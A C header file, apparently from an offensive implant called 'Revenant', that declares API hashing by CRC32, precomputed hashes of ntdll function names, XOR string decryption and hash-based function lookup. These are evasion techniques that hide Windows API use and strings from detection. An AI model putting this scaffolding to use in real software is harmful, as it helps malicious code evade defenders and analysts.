#ifndef REVENANT_OBFUSCATION_H
#define REVENANT_OBFUSCATION_H

#include <stdint.h>
#include "Strings.h"

uint32_t crc32b(const uint8_t *str);

#define HASH(API)(crc32b((uint8_t *)API))

#define RtlRandomEx_CRC32B             0xa8c81c7d
#define RtlGetVersion_CRC32B           0xb0c9e3ff
#define RtlInitUnicodeString_CRC32B    0xe17f353f
#define NtCreateFile_CRC32b            0x962c4683
#define NtQueryInformationFile_CRC32B  0xb54956cb
#define NtAllocateVirtualMemory_CRC32B 0xec50426f



wchar_t *str_to_wide(const char* ascii);
char *xor_dec(char *_t, size_t _t_len, const char *_p, size_t _p_len);


void *get_proc_address_by_hash(void *dll_address, uint32_t function_hash);

#endif //REVENANT_OBFUSCATION_H
